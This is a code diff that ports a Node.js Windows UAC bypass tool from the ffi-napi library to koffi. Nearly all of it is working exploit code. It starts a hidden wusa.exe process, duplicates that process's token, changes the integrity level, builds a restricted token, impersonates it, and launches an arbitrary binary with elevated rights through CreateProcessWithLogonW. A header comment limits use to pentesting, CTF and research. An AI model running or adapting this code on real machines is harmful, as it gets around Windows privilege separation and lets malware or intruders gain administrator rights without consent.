@@ -8,129 +8,135 @@
  * Use only in pentesting engagements, CTF challenges, or security research.
  */
 
-const ffi = require('ffi-napi');
-const ref = require('ref-napi');
-const Struct = require('ref-struct-napi');
-const path = require('path');
-
-// Define basic types
-const DWORD = ref.types.uint32;
-const UINT = ref.types.uint32;
-const BOOL = ref.types.bool;
-const HANDLE = ref.refType(ref.types.void);
-const LPVOID = ref.refType(ref.types.void);
-const LPCWSTR = ref.types.CString;
-const LPWSTR = ref.types.CString;
-const WORD = ref.types.uint16;
-const BYTE = ref.types.uint8;
-const INT = ref.types.int32;
+const koffi = require('koffi');
 
 // Define Windows structures
-const PROCESS_INFORMATION = Struct({
-    hProcess: HANDLE,
-    hThread: HANDLE,
-    dwProcessId: DWORD,
-    dwThreadId: DWORD
+const PROCESS_INFORMATION = koffi.struct('PROCESS_INFORMATION', {
+    hProcess: 'void*',
+    hThread: 'void*',
+    dwProcessId: 'uint32',
+    dwThreadId: 'uint32'
 });
 
-const SECURITY_ATTRIBUTES = Struct({
-    nLength: INT,
-    lpSecurityDescriptor: LPVOID,
-    bInheritHandle: INT
+const SECURITY_ATTRIBUTES = koffi.struct('SECURITY_ATTRIBUTES', {
+    nLength: 'int32',
+    lpSecurityDescriptor: 'void*',
+    bInheritHandle: 'int32'
 });
 
-const SID_AND_ATTRIBUTES = Struct({
-    Sid: LPVOID,
-    Attributes: DWORD
+const SID_AND_ATTRIBUTES = koffi.struct('SID_AND_ATTRIBUTES', {
+    Sid: 'void*',
+    Attributes: 'uint32'
 });
 
-const TOKEN_MANDATORY_LABEL = Struct({
+const TOKEN_MANDATORY_LABEL = koffi.struct('TOKEN_MANDATORY_LABEL', {
     Label: SID_AND_ATTRIBUTES
 });
 
-const STARTUPINFOW = Struct({
-    cb: DWORD,
-    lpReserved: LPWSTR,
-    lpDesktop: LPWSTR,
-    lpTitle: LPWSTR,
-    dwX: DWORD,
-    dwY: DWORD,
-    dwXSize: DWORD,
-    dwYSize: DWORD,
-    dwXCountChars: DWORD,
-    dwYCountChars: DWORD,
-    dwFillAttribute: DWORD,
-    dwFlags: DWORD,
-    wShowWindow: WORD,
-    cbReserved2: WORD,
-    lpReserved2: LPVOID,
-    hStdInput: HANDLE,
-    hStdOutput: HANDLE,
-    hStdError: HANDLE
+const STARTUPINFOW = koffi.struct('STARTUPINFOW', {
+    cb: 'uint32',
+    lpReserved: 'char16*',
+    lpDesktop: 'char16*',
+    lpTitle: 'char16*',
+    dwX: 'uint32',
+    dwY: 'uint32',
+    dwXSize: 'uint32',
+    dwYSize: 'uint32',
+    dwXCountChars: 'uint32',
+    dwYCountChars: 'uint32',
+    dwFillAttribute: 'uint32',
+    dwFlags: 'uint32',
+    wShowWindow: 'uint16',
+    cbReserved2: 'uint16',
+    lpReserved2: 'void*',
+    hStdInput: 'void*',
+    hStdOutput: 'void*',
+    hStdError: 'void*'
 });
 
-const SHELLEXECUTEINFOW = Struct({
-    cbSize: INT,
-    fMask: UINT,
-    hwnd: LPVOID,
-    lpVerb: LPWSTR,
-    lpFile: LPWSTR,
-    lpParameters: LPWSTR,
-    lpDirectory: LPWSTR,
-    nShow: INT,
-    hInstApp: LPVOID,
-    lpIDList: LPVOID,
-    lpClass: LPWSTR,
-    hkeyClass: LPVOID,
-    dwHotKey: DWORD,
-    hIcon: LPVOID,
-    hProcess: HANDLE
+const SHELLEXECUTEINFOW = koffi.struct('SHELLEXECUTEINFOW', {
+    cbSize: 'int32',
+    fMask: 'uint32',
+    hwnd: 'void*',
+    lpVerb: 'char16*',
+    lpFile: 'char16*',
+    lpParameters: 'char16*',
+    lpDirectory: 'char16*',
+    nShow: 'int32',
+    hInstApp: 'void*',
+    lpIDList: 'void*',
+    lpClass: 'char16*',
+    hkeyClass: 'void*',
+    dwHotKey: 'uint32',
+    hIcon: 'void*',
+    hProcess: 'void*'
 });
 
-const SID_IDENTIFIER_AUTHORITY = Struct({
-    Value: ref.types.CString // 6 bytes
+const SID_IDENTIFIER_AUTHORITY = koffi.struct('SID_IDENTIFIER_AUTHORITY', {
+    Value: koffi.array('uint8', 6)
 });
 
-// Load Windows DLLs
-const kernel32 = ffi.Library('kernel32', {
-    'OpenProcess': [HANDLE, [DWORD, BOOL, DWORD]],
-    'TerminateProcess': [BOOL, [HANDLE, UINT]],
-    'GetLastError': [DWORD, []]
-});
+// Load Windows DLLs and define functions
+const kernel32 = koffi.load('kernel32.dll');
+const advapi32 = koffi.load('advapi32.dll');
+const ntdll = koffi.load('ntdll.dll');
+const shell32 = koffi.load('shell32.dll');
 
-const advapi32 = ffi.Library('advapi32', {
-    'OpenProcessToken': [BOOL, [HANDLE, DWORD, ref.refType(HANDLE)]],
-    'DuplicateTokenEx': [BOOL, [HANDLE, DWORD, ref.refType(SECURITY_ATTRIBUTES), INT, INT, ref.refType(HANDLE)]],
-    'AllocateAndInitializeSid': [BOOL, [
-        ref.refType(SID_IDENTIFIER_AUTHORITY),
-        BYTE,
-        DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD,
-        ref.refType(LPVOID)
-    ]],
-    'ImpersonateLoggedOnUser': [BOOL, [HANDLE]],
-    'CreateProcessWithLogonW': [BOOL, [
-        LPWSTR,  // userName
-        LPWSTR,  // domain
-        LPWSTR,  // password
-        DWORD,   // logonFlags
-        LPWSTR,  // applicationName
-        LPWSTR,  // commandLine
-        DWORD,   // creationFlags
-        LPVOID,  // environment
-        LPWSTR,  // currentDirectory
-        ref.refType(STARTUPINFOW),
-        ref.refType(PROCESS_INFORMATION)
-    ]]
-});
+// Kernel32 functions
+const OpenProcess = kernel32.func('OpenProcess', 'void*', ['uint32', 'bool', 'uint32']);
+const TerminateProcess = kernel32.func('TerminateProcess', 'bool', ['void*', 'uint32']);
+const GetLastError = kernel32.func('GetLastError', 'uint32', []);
 
-const ntdll = ffi.Library('ntdll', {
-    'NtSetInformationToken': [INT, [HANDLE, INT, ref.refType(TOKEN_MANDATORY_LABEL), INT]],
-    'NtFilterToken': [INT, [HANDLE, DWORD, LPVOID, LPVOID, LPVOID, ref.refType(HANDLE)]]
-});
+// Advapi32 functions
+const OpenProcessToken = advapi32.func('OpenProcessToken', 'bool', ['void*', 'uint32', 'void**']);
+const DuplicateTokenEx = advapi32.func('DuplicateTokenEx', 'bool', [
+    'void*',
+    'uint32',
+    koffi.pointer(SECURITY_ATTRIBUTES),
+    'int32',
+    'int32',
+    'void**'
+]);
+const AllocateAndInitializeSid = advapi32.func('AllocateAndInitializeSid', 'bool', [
+    koffi.pointer(SID_IDENTIFIER_AUTHORITY),
+    'uint8',
+    'uint32', 'uint32', 'uint32', 'uint32',
+    'uint32', 'uint32', 'uint32', 'uint32',
+    'void**'
+]);
+const ImpersonateLoggedOnUser = advapi32.func('ImpersonateLoggedOnUser', 'bool', ['void*']);
+const CreateProcessWithLogonW = advapi32.func('CreateProcessWithLogonW', 'bool', [
+    'char16*',  // userName
+    'char16*',  // domain
+    'char16*',  // password
+    'uint32',   // logonFlags
+    'char16*',  // applicationName
+    'char16*',  // commandLine
+    'uint32',   // creationFlags
+    'void*',    // environment
+    'char16*',  // currentDirectory
+    koffi.out(koffi.pointer(STARTUPINFOW)),
+    koffi.out(koffi.pointer(PROCESS_INFORMATION))
+]);
 
-const shell32 = ffi.Library('shell32', {
-    'ShellExecuteExW': [BOOL, [ref.refType(SHELLEXECUTEINFOW)]]
-});
+// Ntdll functions
+const NtSetInformationToken = ntdll.func('NtSetInformationToken', 'int32', [
+    'void*',
+    'int32',
+    koffi.pointer(TOKEN_MANDATORY_LABEL),
+    'int32'
+]);
+const NtFilterToken = ntdll.func('NtFilterToken', 'int32', [
+    'void*',
+    'uint32',
+    'void*',
+    'void*',
+    'void*',
+    'void**'
+]);
+
+// Shell32 functions
+const ShellExecuteExW = shell32.func('ShellExecuteExW', 'bool', [koffi.pointer(SHELLEXECUTEINFOW)]);
 
 // Constants
 const TOKEN_QUERY = 0x0008;
@@ -197,32 +203,39 @@ function performUACBypass(binPath, args, procPID) {
     if (procPID) {
         // Use existing process
         log(`Attempting to use process PID: ${procPID}`);
-        hProcess = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, procPID);
+        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, procPID);
 
-        if (hProcess.isNull()) {
+        if (!hProcess || hProcess === null) {
             error('Failed to get process handle!');
-            error(`Last error: ${kernel32.GetLastError()}`);
+            error(`Last error: ${GetLastError()}`);
             process.exit(1);
         }
         log(`Successfully acquired process handle for PID ${procPID}`);
     } else {
         // Create new WUSA process
         log('Creating WUSA process...');
-        shellInfo = new SHELLEXECUTEINFOW();
-        shellInfo.cbSize = SHELLEXECUTEINFOW.size;
-        shellInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
-        shellInfo.lpFile = 'wusa.exe';
-        shellInfo.nShow = SW_HIDE;
-        shellInfo.hwnd = ref.NULL;
-        shellInfo.lpVerb = ref.NULL;
-        shellInfo.lpParameters = ref.NULL;
-        shellInfo.lpDirectory = ref.NULL;
-        shellInfo.hInstApp = ref.NULL;
+        shellInfo = {
+            cbSize: koffi.sizeof(SHELLEXECUTEINFOW),
+            fMask: SEE_MASK_NOCLOSEPROCESS,
+            hwnd: null,
+            lpVerb: null,
+            lpFile: 'wusa.exe',
+            lpParameters: null,
+            lpDirectory: null,
+            nShow: SW_HIDE,
+            hInstApp: null,
+            lpIDList: null,
+            lpClass: null,
+            hkeyClass: null,
+            dwHotKey: 0,
+            hIcon: null,
+            hProcess: null
+        };
 
-        const result = shell32.ShellExecuteExW(shellInfo.ref());
+        const result = ShellExecuteExW(shellInfo);
         if (!result) {
             error('Failed to create WUSA process!');
-            error(`Last error: ${kernel32.GetLastError()}`);
+            error(`Last error: ${GetLastError()}`);
             process.exit(1);
         }
         log('WUSA process created');
@@ -231,68 +244,70 @@ function performUACBypass(binPath, args, procPID) {
 
     // Open process token
     log('Opening process token...');
-    const hToken = ref.alloc(HANDLE);
-    if (!advapi32.OpenProcessToken(hProcess, MAXIMUM_ALLOWED, hToken)) {
+    const hToken = [null];
+    if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, hToken)) {
         error('Failed to open process token!');
-        error(`Last error: ${kernel32.GetLastError()}`);
+        error(`Last error: ${GetLastError()}`);
         process.exit(1);
     }
     log('Opened process token');
 
     // Duplicate token
     log('Duplicating process token...');
-    const hNewToken = ref.alloc(HANDLE);
-    const secAttr = new SECURITY_ATTRIBUTES();
-    secAttr.nLength = SECURITY_ATTRIBUTES.size;
-    secAttr.lpSecurityDescriptor = ref.NULL;
-    secAttr.bInheritHandle = 0;
+    const hNewToken = [null];
+    const secAttr = {
+        nLength: koffi.sizeof(SECURITY_ATTRIBUTES),
+        lpSecurityDescriptor: null,
+        bInheritHandle: 0
+    };
 
-    if (!advapi32.DuplicateTokenEx(
-        hToken.deref(),
+    if (!DuplicateTokenEx(
+        hToken[0],
         TOKEN_ALL_ACCESS,
-        secAttr.ref(),
+        secAttr,
         SecurityImpersonation,
         TokenPrimary,
         hNewToken
     )) {
         error('Failed to duplicate process token!');
-        error(`Last error: ${kernel32.GetLastError()}`);
+        error(`Last error: ${GetLastError()}`);
         process.exit(1);
     }
     log('Duplicated process token');
 
     // Initialize SID for medium integrity level
     log('Initializing MedIL SID...');
-    const sidAuth = new SID_IDENTIFIER_AUTHORITY();
-    sidAuth.Value = Buffer.from([0x0, 0x0, 0x0, 0x0, 0x0, 0x10]);
+    const sidAuth = {
+        Value: [0x0, 0x0, 0x0, 0x0, 0x0, 0x10]
+    };
 
-    const pSID = ref.alloc(LPVOID);
-    if (!advapi32.AllocateAndInitializeSid(
-        sidAuth.ref(),
+    const pSID = [null];
+    if (!AllocateAndInitializeSid(
+        sidAuth,
         1,
         0x2000, 0, 0, 0, 0, 0, 0, 0,
         pSID
     )) {
         error('Failed to initialize SID!');
-        error(`Last error: ${kernel32.GetLastError()}`);
+        error(`Last error: ${GetLastError()}`);
         process.exit(1);
     }
     log('Initialized MedIL SID');
 
     // Set token integrity level
     log('Setting token mandatory IL...');
-    const sidAndAttr = new SID_AND_ATTRIBUTES();
-    sidAndAttr.Sid = pSID.deref();
-    sidAndAttr.Attributes = SE_GROUP_INTEGRITY;
+    const tokenLabel = {
+        Label: {
+            Sid: pSID[0],
+            Attributes: SE_GROUP_INTEGRITY
+        }
+    };
 
-    const tokenLabel = new TOKEN_MANDATORY_LABEL();
-    tokenLabel.Label = sidAndAttr;
-
-    const ntStatus = ntdll.NtSetInformationToken(
-        hNewToken.deref(),
+    const ntStatus = NtSetInformationToken(
+        hNewToken[0],
         TokenIntegrityLevel,
-        tokenLabel.ref(),
-        TOKEN_MANDATORY_LABEL.size
+        tokenLabel,
+        koffi.sizeof(TOKEN_MANDATORY_LABEL)
     );
 
     if (ntStatus !== 0) {
@@ -304,13 +319,13 @@ function performUACBypass(binPath, args, procPID) {
 
     // Create restricted token
     log('Creating restricted token...');
-    const luaToken = ref.alloc(HANDLE);
-    const ntStatus2 = ntdll.NtFilterToken(
-        hNewToken.deref(),
+    const luaToken = [null];
+    const ntStatus2 = NtFilterToken(
+        hNewToken[0],
         LUA_TOKEN,
-        ref.NULL,
-        ref.NULL,
-        ref.NULL,
+        null,
+        null,
+        null,
         luaToken
     );
 
@@ -323,53 +338,72 @@ function performUACBypass(binPath, args, procPID) {
 
     // Duplicate restricted token
     log('Duplicating restricted token...');
-    const hFinalToken = ref.alloc(HANDLE);
-    const secAttr2 = new SECURITY_ATTRIBUTES();
-    secAttr2.nLength = SECURITY_ATTRIBUTES.size;
-    secAttr2.lpSecurityDescriptor = ref.NULL;
-    secAttr2.bInheritHandle = 0;
+    const hFinalToken = [null];
+    const secAttr2 = {
+        nLength: koffi.sizeof(SECURITY_ATTRIBUTES),
+        lpSecurityDescriptor: null,
+        bInheritHandle: 0
+    };
 
-    if (!advapi32.DuplicateTokenEx(
-        luaToken.deref(),
+    if (!DuplicateTokenEx(
+        luaToken[0],
         TOKEN_IMPERSONATE | TOKEN_QUERY,
-        secAttr2.ref(),
+        secAttr2,
         SecurityImpersonation,
         TokenImpersonation,
         hFinalToken
     )) {
         error('Failed to duplicate restricted token!');
-        error(`Last error: ${kernel32.GetLastError()}`);
+        error(`Last error: ${GetLastError()}`);
         process.exit(1);
     }
     log('Duplicated restricted token');
 
     // Impersonate security context
     log('Impersonating security context...');
-    if (!advapi32.ImpersonateLoggedOnUser(hFinalToken.deref())) {
+    if (!ImpersonateLoggedOnUser(hFinalToken[0])) {
         error('Failed to impersonate context!');
-        error(`Last error: ${kernel32.GetLastError()}`);
+        error(`Last error: ${GetLastError()}`);
         process.exit(1);
     }
     log('Successfully impersonated security context');
 
     // Prepare to spawn elevated process
     log('Preparing to spawn elevated process...');
-    const startupInfo = new STARTUPINFOW();
-    startupInfo.cb = STARTUPINFOW.size;
-    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
-    startupInfo.wShowWindow = SW_SHOW;
-    startupInfo.lpReserved = ref.NULL;
-    startupInfo.lpDesktop = ref.NULL;
-    startupInfo.lpTitle = ref.NULL;
+    const startupInfo = {
+        cb: koffi.sizeof(STARTUPINFOW),
+        lpReserved: null,
+        lpDesktop: null,
+        lpTitle: null,
+        dwX: 0,
+        dwY: 0,
+        dwXSize: 0,
+        dwYSize: 0,
+        dwXCountChars: 0,
+        dwYCountChars: 0,
+        dwFillAttribute: 0,
+        dwFlags: STARTF_USESHOWWINDOW,
+        wShowWindow: SW_SHOW,
+        cbReserved2: 0,
+        lpReserved2: null,
+        hStdInput: null,
+        hStdOutput: null,
+        hStdError: null
+    };
 
-    const processInfo = new PROCESS_INFORMATION();
+    const processInfo = {
+        hProcess: null,
+        hThread: null,
+        dwProcessId: 0,
+        dwThreadId: 0
+    };
 
     const currentDir = process.env.SystemRoot || 'C:\\Windows';
     const commandLine = args ? `${binPath} ${args}` : binPath;
 
     // Spawn elevated process
     log(`Spawning: ${commandLine}`);
-    if (!advapi32.CreateProcessWithLogonW(
+    if (!CreateProcessWithLogonW(
         'aaa',
         'bbb',
         'ccc',
@@ -377,13 +411,13 @@ function performUACBypass(binPath, args, procPID) {
         binPath,
         commandLine,
         CREATE_NO_WINDOW,
-        ref.NULL,
+        null,
         currentDir,
-        startupInfo.ref(),
-        processInfo.ref()
+        startupInfo,
+        processInfo
     )) {
         error('Failed to create process!');
-        error(`Last error: ${kernel32.GetLastError()}`);
+        error(`Last error: ${GetLastError()}`);
         process.exit(1);
     }
 
@@ -393,7 +427,7 @@ function performUACBypass(binPath, args, procPID) {
     // Cleanup: Kill WUSA if we created it
     if (!procPID && shellInfo) {
         log('Cleaning up WUSA process...');
-        kernel32.TerminateProcess(shellInfo.hProcess, 1);
+        TerminateProcess(shellInfo.hProcess, 1);
     }
 
     log('UAC bypass completed successfully!');
@@ -427,7 +461,7 @@ Examples:
 
 Requirements:
   - Windows OS
-  - Node.js with ffi-napi support
+  - Node.js 12.0.0 or higher
   - Run 'npm install' before first use
         `);
         process.exit(0);
